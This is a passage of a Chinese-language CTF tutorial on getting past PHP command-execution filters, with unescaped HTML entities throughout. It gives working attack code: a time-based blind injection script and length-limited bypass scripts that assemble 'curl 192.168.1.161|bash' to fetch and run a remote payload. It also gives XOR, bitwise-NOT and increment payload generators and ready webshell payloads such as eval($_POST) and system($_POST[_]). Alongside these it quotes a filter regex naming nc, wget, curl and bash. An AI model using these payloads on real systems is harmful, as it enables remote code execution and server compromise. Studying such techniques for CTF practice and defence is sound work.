&quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot; |bash# python 一般linux环境都会带有，python的操作空间很大，自己家xor、编码都可以python -c &quot;with open(&#x27;/flag&#x27;, &#x27;r&#x27;) as f: content = f.read(); print(content)&quot;python3 -c &quot;import os; content = os.popen(&#x27;cat /flag&#x27;).read(); print(content)&quot;\n如果我们可以直接拿到eval的内容控制，那么解法就会非常多，你可以自己写一个xor异或去执行解码，等等…\n无回显时间盲注&lt;?phperror_reporting(0);function check($x)&#123;    if(preg_match(&#x27;/\\\\$|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;        die(&#x27;too young too simple sometimes naive!&#x27;);    &#125;&#125;if(isset($_GET[&#x27;cmd&#x27;]))&#123;    $cmd=$_GET[&#x27;cmd&#x27;];    check($cmd);    exec($cmd);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n采用exec去执行的，并且不输出内容，这里就是不回显的，需要进行盲注，具体可以利用的命令如下\nsleep &#123;time s&#125; # 命令拼接数字，单位是秒，延迟多少秒 awk &#123;NR=*&#125;     # awk NR==1 代表读取第一行cut -c         # cut -c1 表示读取当前行的第1个字符\n可以根据上面语句进行编写shell脚本，如下\nif [ `cat flag.php | awk NR==1 | cut -c1` == f ];then sleep 2;fi\n如果flag.php的第一行的第一个字符是’f’那么就延时2秒返回，我们可以通过http返回相应的时间来判断是否成功，具体就可以编写出下面python脚本\nimport requestsimport timeurl = &quot;http://localhost/&quot;result = &quot;&quot;for i in range(1,5):    for j in range(1,55):        #ascii挨个遍历爆破        for k in range(32,128):            k=chr(k)            #time.sleep(0.1)            payload = &quot;?cmd=&quot; + f&quot;if [ `cat flag.php | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#123;k&#125; ];then sleep 2;fi&quot;            try:                requests.get(url=url+payload, timeout=(1.5,1.5))            except:                result = result + k                print(result)                break    result += &quot; &quot;\n思路就是爆破5行，然后一行爆破55个，每次都从ASCII的32开始到128结束，具体延时2秒，如果1.5秒还没回显那么说明成功，追加到输出中，脚本可以自己根据情况进行修改。\n长度过滤绕过长度绕过这里说两个比较典型的，首先是7位长度的\n&lt;?phphighlight_file(__FILE__);error_reporting(E_ALL);function filter($argv)&#123;    $a = str_replace(&quot;/\\*|\\?|/&quot;,&quot;=====&quot;,$argv);    return $a;&#125;if (isset($_GET[&#x27;cmd&#x27;]) &amp;&amp; strlen($_GET[&#x27;cmd&#x27;]) &lt;= 7) &#123;    exec(filter($_GET[&#x27;cmd&#x27;]));&#125; else  &#123;    echo &quot;flag in local path flag file!!&quot;;&#125;\n然后就是4为长度的\n&lt;?phphighlight_file(__FILE__);error_reporting(E_ALL);function filter($argv)&#123;    str_replace(&quot;/\\?|/&quot;,&quot;=====&quot;,$argv);    return $argv;&#125;if (isset($_GET[&#x27;cmd&#x27;]) &amp;&amp; strlen($_GET[&#x27;cmd&#x27;]) &lt;= 4) &#123;    exec(filter($_GET[&#x27;cmd&#x27;]));&#125; else  &#123;    echo &quot;flag in local path flag file!&quot;;&#125;\n他们两个都不会回显数据，比较通用的思路如下按照命令cat flag为例子，他是8个字符，如果想要长度不能超过7的方式去执行，那么可以执行下面命令来绕过\n&gt;ag&gt;fl\\\\&gt;&quot;t \\\\&quot;&gt;ca\\\\ls -t&gt;ash a\n前面的&gt;xxx是为了创建文件，然后\\\\用作转义我们可以看看ls -t命令的回显，如下\n┌──(root㉿BoyChaiWindows)-[~/temp/test]└─# ls -t flag   a  &#x27;ca\\&#x27;  &#x27;t \\&#x27;  &#x27;fl\\&#x27;   ag\na文件内容如下\n┌──(root㉿BoyChaiWindows)-[~/temp/test]└─# cat aaca\\t \\fl\\ag\n它通过\\去换行继续输出命令，最终实际执行的内容就是cat flag，上面的操作因为需要执行ls -t&gt;a所以只能在长度等于或者大于7的时候使用，然后因为是创建文件的形式，所有的都无法去直接查看/下的内容，我们可以采用反弹shell的形式去查看，这里给出两个exp，分别是长度为5和长度为4的时候的解决办法，5的是这样\n#encoding:utf-8import timeimport requestsbaseurl = &quot;http://192.168.1.6:19080/class09/3/index.php?cmd=&quot;s = requests.session()# 将ls -t 写入文件_list=[    &quot;&gt;ls\\\\&quot;,    &quot;ls&gt;_&quot;,    &quot;&gt;\\ \\\\&quot;,    &quot;&gt;-t\\\\&quot;,    &quot;&gt;\\&gt;y&quot;,    &quot;ls&gt;&gt;_&quot;]# curl 192.168.1.161/1|bashlist2=[    &quot;&gt;bash&quot;,    &quot;&gt;\\|\\\\&quot;,    &quot;&gt;\\/\\\\&quot;,    &quot;&gt;61\\\\&quot;,    &quot;&gt;1\\\\&quot;,    &quot;&gt;1.\\\\&quot;,    &quot;&gt;8.\\\\&quot;,    &quot;&gt;16\\\\&quot;,    &quot;&gt;2.\\\\&quot;,    &quot;&gt;19\\\\&quot;,    &quot;&gt;\\ \\\\&quot;,    &quot;&gt;rl\\\\&quot;,    &quot;&gt;cu\\\\&quot;]for i in list:    time.sleep(1)    url = baseurl+str(i)    s.get(url)for j in list2:    time.sleep(1)    url = baseurl+str(j)    s.get(url)s.get(baseurl+&quot;sh _&quot;)s.get(baseurl+&quot;sh y&quot;)\n如果长度是4的话那么可以采用下面脚本\n#encoding:utf-8import timeimport requestsbaseurl = &quot;http://192.168.1.6:19080/class09/4/ffff.php?cmd=&quot;s = requests.session()# 将ls -t 写入文件glist=[    &quot;&gt;g\\;&quot;,    &quot;&gt;g\\&gt;&quot;,    &quot;&gt;ht-&quot;,    &quot;&gt;sl&quot;,    &quot;&gt;dir&quot;,    &quot;*&gt;v&quot;,    &quot;&gt;rev&quot;,    &quot;*v&gt;x&quot;]# curl 192.168.1.161|bashlist2= [    &quot;&gt;ash&quot;,    &quot;&gt;b\\\\&quot;,    &#x27;&gt;\\|\\\\&#x27;,    &#x27;&gt;A1\\\\&#x27;,    &#x27;&gt;01\\\\&#x27;,    &#x27;&gt;A8\\\\&#x27;,    &#x27;&gt;C0\\\\&#x27;,    &#x27;&gt;0x\\\\&#x27;,    &#x27;&gt;\\ \\\\&#x27;,    &#x27;&gt;rl\\\\&#x27;,    &#x27;&gt;cu\\\\&#x27;]for i in list:    time.sleep(1)    url = baseurl+str(i)    s.get(url)for j in list2:    time.sleep(1)    url = baseurl+str(j)    s.get(url)s.get(baseurl+&quot;sh x&quot;)s.get(baseurl+&quot;sh g&quot;)\n可以根据自己的情况进行修改Moab那脚本所执行的内容命令。PS：如果是7位的话也可以这样nl /fl*\n无参命令执行&lt;?phperror_reporting(0);highlight_file(__FILE__);if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;    eval($_GET[&#x27;code&#x27;]);&#125;?&gt;\n先分析一下代码，里面就一个正则的判断，如果规则最终匹配替换到一个;那么就继续运行，否则不执行，其中里面的正则/[^\\W]+\\((?R)?\\)/我们拆解一下分析[^\\W]的含义是指A-Za-z0-9_数字字母都会被匹配，然后就是\\((?R)?\\)递归的去匹配xxx()这种形式的字符串，就是必须带一个()，并且括弧中不允许有任何内容，然后这是一个递归的匹配即a(b(c()))都可以，就是里面不允许有内容，例如phpinfo();最红就会被替换成一个;，我们如果想要执行命令，如果用传统的办法肯定是不行，这里可以采用下面几种绕过的方式。\n请求头绕过第一种是我们通过传请求头内容我们可以通过getallheaders()函数获取所有请求头内容，请求头我们也是可以控制的，例如构造一个这样的请求code=print_r(getallheaders());，然后在请求头中再加一个数据，这个随便，看一下回显我在请求头的最后加了一个exec: dir的项，然后通过getallheader()获取了出来，他返回了一个array数组，我们可以通过他自身的一些操作数组的函数来直接获取到第一个的数据例如pos()或者最后一个end()，我们再次构造code为print_r(pos(getallheaders()));，回显内容即变成了dir,如下图\n这个时候就比较好理解了，print_r直接包裹一个system即可执行命令然后就是还有一个apache_request_headers()函数效果一样，但是这个应该是需要一个apache的支持。需要注意的是，header传入的时候需要放到最后面才是里面数组的第一个，或则放到最前面，用end()获取最后一个。\n全局变量绕过第二种是通过全局变量的形式来做命令执行的绕过，环境变量可以通过函数get_defined_vars()来获取，我们可以通过print_r(get_defined_vars());来获取他的内容他会返回所有当前定义的变量，并且依旧是数组的形式，格式化之后是长这个样子GET数组中有咱们刚才传入的参数，并且还是个数组，我们依旧可以通过这个去绕过，例如构造一个这样的payload?code=print_r(end(pos(get_defined_vars())));&amp;exec=dir，返回值如下这里就比较简单了我们直接把print_r替换成system即可\nSESSION绕过第三种方法是通过session绕过，但是他应该是之能在php5中使用，下面介绍两个函数session_start()和session_id()第一个start是如果当前传入了sessionid的话则返回true，也就是1，然后第二个id，如果传入的内容是true，那么他就会返回当前的sessionid，sessionid我们是可以控制的，在burp中抓包可以直接修改他，我们构造一个这样的payloadprint_r(session_id(session_start()));，然后修改sessionid为cat$IFS/flag去发送请求，返回值如下到这里的话我们就可以直接把print_r修改成system了。\n其他的方法绕过这个的方法有很多很多，如果前面几种都不可以使用那么你就可以通过当前的方法来做了，具体思路就是通过php的一些内置函数获取当前目录或者获取目录的内容，然后通过php内置的函数，例如获取第一个或者最后一个，再去通过一些read函数的组合来读取flag，总之就是各种的函数拼接，这里不去细说了，因为太多了，做到这里就可以用ai来去查询一些相关的函数了，其实操作空间很大，因为并没有禁止咱们去执行的内容，只是不让传参。\n可逆运算绕过&lt;?phphighlight_file(__FILE__);error_reporting(0);if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;cmd&#x27;])) &#123;    eval($_GET[&#x27;cmd&#x27;]);&#125;\n先分析一下代码，他这里存在一个正则的验证，不能有大小写字母a-z然后不能有0-9，也就是说所有的字母和数字都被过滤了，这种只能输入符号来解决，这种的过滤可以通过下面几种方法绕过。\n异或运算异或是干什么事的这里不多说，不了解的话可以参考这篇文章https://www.ruanyifeng.com/blog/2021/01/_xor.html，这里主要是通过可见字符去异或可见字符拿到一个他限制的内容，具体可以通过下面脚本来爆破对应文本所需的异或符号\n&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);error_reporting(0);$shell = $_GET[&quot;cmd&quot;];$result1 = &quot;&quot;;$result2 = &quot;&quot;;function judge($c)&#123;    if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$c))    &#123;        return true;    &#125;    return false;&#125;for($num=0;$num&lt;=strlen($shell);$num++)&#123;    for($x=33;$x&lt;=126;$x++)    &#123;        if(judge(chr($x)))        &#123;            for($y=33;$y&lt;=126;$y++)            &#123;                if(judge(chr($y)))                &#123;                    $f = chr($x)^chr($y);                    if($f == $shell[$num])                    &#123;                        $result1 .= chr($x);                        $result2 .= chr($y);                        break 2;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;echo &quot;异或运算第一部分： &quot;.$result1;echo &quot;&lt;br&gt;&quot;;echo &quot;异或运算第二部分： &quot;.$result2;\n例如我们想要执行phpinfo，他返回的内容是\n异或运算第一部分： +(+).&amp;/异或运算第二部分： [@[@@@@\n我们可以构造一个$_=&quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;;$_()的方式来去执行它，返回值如下需要注意的是，符号存在+，它会被自动解析成空格，我们需要给他加一层url编码，如果要执行命令则可以构造一个一句话木马来执行，这个转换还有编码其实蛮麻烦的，我这里直接给出一个通用的，如果不行的话大家可以通过上面脚本自己去生成对应的命令\n$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])\n上面这个实际就是代表eval($_POST[&#39;a&#39;])，去post中转入命令即可\n取反绕过简单认识一下取反，以字符a为例，拿到他的2进制那就是01100001，具体可以通过python去获取他们的二进制print(bin(ord(&quot;a&quot;)))，如果对a进行取反，那么最终的值就是从01100001-&gt;10011110，这个值是9E，通过url编码最后拿到一个中文字符极。我们如果输入的内容是一个中文极，再给他加一个取反符号，那么他就会是一个a，如果要再php中取反可以使用~(&quot;极&quot;)这样。然后给出一个生成取反绕过的一个网页\n&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);error_reporting(0);$shell = $_GET[&#x27;cmd&#x27;];$result = &quot;&quot;;$arr =array();$word = &quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;;function mb_str_split( $string ) &#123;    return preg_split(&#x27;/(?&lt;!^)(?!$)/u&#x27;, $string );&#125;foreach (mb_str_split($word) as $c)&#123;    $arr[] = $c;&#125;for ($x=0;$x&lt;strlen($shell);$x++)&#123;    for ($y=0;$y&lt;count($arr);$y++)    &#123;        $k = $arr[$y];        if ($shell[$x] == ~($k&#123;1&#125;))        &#123;            $result .= $k;            $result1 .= &quot;%&quot;.bin2hex($k&#123;1&#125;);            break;        &#125;    &#125;&#125;echo &quot;通过在URL内GET方法提交?cmd=\\&quot;具体命令\\&quot;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;字符串：&quot;.$result;echo &quot;&lt;br&gt;&quot;;echo &quot;URL编码：&quot;.$result1;\n下面给出一个比较通用的取反payload\n// php5、7.2 pss = _$_=~(&quot;%9e%8c%8c%9a%8d%8b&quot;);$__=~(&quot;%a0%af%b0%ac%ab&quot;);$___=$$__;$_($___[_]);// 无回显 `$_POST[_]` pass = _ 一般用来反弹shell$__=~(&quot;%A0%AF%B0%AC%AB&quot;);$___=$$__;`$___[_]`;// `system($_POST[_])` pss = _$_=~(&quot;%8c%86%8c%8b%9a%92&quot;);$__=~(&quot;%a0%af%b0%ac%ab&quot;);$___=$$__;$_($___[_]);\n自增绕过自增绕过，主要是利用++的方式去1，如果可以拿到A那么就可以拿到所有可见的字母和数字，这个A字母的获取可以通过下面方法\n&lt;?php$_=[].&#x27;&#x27;;echo $_;       // Arrayecho $_[0];    // Aecho $_[$__];  // A?&gt;\n里面的[]是一个数组，如果直接输出则会返回Array，这样第一个字母就是咱们想要的内容了，但是如果直接通过[0]的方式去拿，会出问题，拿不到需要给他变成字符串形式[].&#39;&#39;即可，然后0我们是没办法输入的，我们可以随便传入一个不存在的变量，不存在的变量都会返回false也就是0,我们直接使用他就可以第一个。下面给一个生成自增的脚本，但是似乎有点问题，开头的第一个命令似乎百分百是A,即只能构造ASSERT的，后面会给出一些常用的\n&lt;?phphighlight_file(__FILE__);$cmd = strtoupper($_GET[&#x27;cmd&#x27;]);$cmd2 = strtoupper($_GET[&#x27;post&#x27;]);function POC($cmd)&#123;    $i = 0;    $POC_pat1 = &quot;\\$__=\\$___;&quot;;    $POC_pat2 = &quot;\\$_ .=\\$__;&quot;;    while ($i&lt;strlen($cmd))&#123;        $str1 = $cmd[$i];        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex(&quot;A&quot;),16,10);        if ($i&lt;1) &#123;            $POC_pat3 = str_repeat(&quot;++\\$__;&quot;,$POC1);            echo $POC_pat3;        &#125;else&#123;            $str2 = $cmd[$i-1];            if($str1==$str2)&#123;                $POC_pat5 = $POC_pat2;                echo $POC_pat5;            &#125;else&#123;                $POC_pat6 = $POC_pat1.str_repeat(&quot;++\\$__;&quot;,$POC1).$POC_pat2;                echo $POC_pat6;            &#125;        &#125;        $i++;    &#125;&#125;function POC2($cmd)&#123;    $i = 0;    echo &#x27;$____ = &quot;_&quot;;$__=$___;&#x27;;    $POC_pat1 = &quot;\\$__=\\$___;&quot;;    $POC_pat2 = &quot;\\$____ .=\\$__;&quot;;    while ($i&lt;strlen($cmd))&#123;        $str1 = $cmd[$i];        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex(&quot;A&quot;),16,10);        if ($i&lt;1) &#123;            $POC_pat3 = str_repeat(&quot;++\\$__;&quot;,$POC1).$POC_pat2;            echo $POC_pat3;        &#125;else&#123;            $str2 = $cmd[$i-1];            if($str1==$str2)&#123;                $POC_pat5 = $POC_pat2;                echo $POC_pat5;            &#125;else&#123;                $POC_pat6 = $POC_pat1.str_repeat(&quot;++\\$__;&quot;,$POC1).$POC_pat2;                echo $POC_pat6;            &#125;        &#125;        $i++;    &#125;&#125;if (!empty($cmd))&#123;    $POC_pat7 = &quot;\\$_=[].&#x27;&#x27;;\\$___=\\$_[\\$__];\\$__=\\$___;\\$_=\\$___;&quot;;    echo $POC_pat7;    POC($cmd);&#125;if (!empty($cmd2))&#123;    POC2($cmd2);&#125;?&gt;\n然后下面直接给一个常用的payloadASSERT($_POST[_]);\n$_=[];$_=@&quot;$_&quot;; $_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; $___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__; $__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; 